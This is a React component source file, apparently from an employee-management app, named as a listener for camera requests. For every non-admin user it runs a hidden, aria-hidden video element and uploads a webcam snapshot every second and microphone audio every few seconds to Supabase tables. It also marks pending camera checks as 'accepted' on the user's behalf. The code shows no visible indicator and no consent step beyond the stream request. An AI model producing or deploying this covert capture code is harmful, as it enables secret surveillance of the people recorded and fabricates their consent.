import { useEffect, useRef, useState } from 'react'
import { useAuth } from '../context/AuthContext'
import { getMediaStream } from '../lib/mediaAccess'
import { supabase } from '../lib/supabaseClient'

function blobToDataUrl(blob) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onloadend = () => resolve(reader.result)
    reader.onerror = reject
    reader.readAsDataURL(blob)
  })
}

function getAudioMimeType() {
  if (!window.MediaRecorder) return ''

  const types = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4']
  return types.find((type) => MediaRecorder.isTypeSupported(type)) || ''
}

export default function CameraRequestListener() {
  const { user } = useAuth()
  const [ready, setReady] = useState(false)
  const previewRef = useRef(null)
  const captureTimerRef = useRef(null)
  const recorderRef = useRef(null)
  const startedRef = useRef(false)

  async function publishFrame(userId) {
    const video = previewRef.current
    if (!video?.videoWidth || !video?.videoHeight) return

    const canvas = document.createElement('canvas')
    const maxWidth = 360
    const scale = Math.min(1, maxWidth / video.videoWidth)
    canvas.width = Math.round(video.videoWidth * scale)
    canvas.height = Math.round(video.videoHeight * scale)

    const ctx = canvas.getContext('2d')
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height)

    const now = new Date().toISOString()
    const snapshotData = canvas.toDataURL('image/jpeg', 0.55)

    await supabase.from('employee_media').upsert({
      user_id: userId,
      snapshot_data: snapshotData,
      snapshot_at: now,
      updated_at: now,
    })

    await supabase
      .from('camera_checks')
      .update({
        status: 'accepted',
        snapshot_data: snapshotData,
        snapshot_at: now,
      })
      .eq('target_id', userId)
      .eq('status', 'requested')
  }

  function startAudioCapture(stream, userId) {
    const audioTracks = stream.getAudioTracks()
    if (!audioTracks.length || !window.MediaRecorder) return

    try {
      const mimeType = getAudioMimeType()
      const options = mimeType ? { mimeType } : undefined
      const recorder = new MediaRecorder(new MediaStream(audioTracks), options)
      recorderRef.current = recorder

      recorder.addEventListener('dataavailable', async (event) => {
        if (!event.data.size) return

        const now = new Date().toISOString()
        const audioData = await blobToDataUrl(event.data)

        await supabase.from('employee_media').upsert({
          user_id: userId,
          audio_data: audioData,
          audio_at: now,
          updated_at: now,
        })

        await supabase
          .from('camera_checks')
          .update({
            status: 'accepted',
            audio_data: audioData,
            audio_at: now,
          })
          .eq('target_id', userId)
          .eq('status', 'requested')
      })

      recorder.start(2500)
    } catch {
      recorderRef.current = null
    }
  }

  useEffect(() => {
    if (!user?.id || user.isAdmin || startedRef.current) return

    let cancelled = false
    startedRef.current = true

    async function startPublishing() {
      try {
        const stream = await getMediaStream()
        if (cancelled) return

        setReady(true)

        setTimeout(async () => {
          if (!previewRef.current || cancelled) return

          previewRef.current.srcObject = stream
          await previewRef.current.play().catch(() => {})
          await publishFrame(user.id)
          captureTimerRef.current = window.setInterval(() => publishFrame(user.id), 1000)
          startAudioCapture(stream, user.id)
        })
      } catch {
        startedRef.current = false
      }
    }

    startPublishing()

    return () => {
      cancelled = true
      if (captureTimerRef.current) window.clearInterval(captureTimerRef.current)
      if (recorderRef.current?.state === 'recording') recorderRef.current.stop()
      captureTimerRef.current = null
      recorderRef.current = null
      startedRef.current = false
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [user?.id, user?.isAdmin])

  if (!ready) return null

  return (
    <video
      ref={previewRef}
      className="camera-hidden-capture"
      autoPlay
      playsInline
      muted
      aria-hidden="true"
    />
  )
}
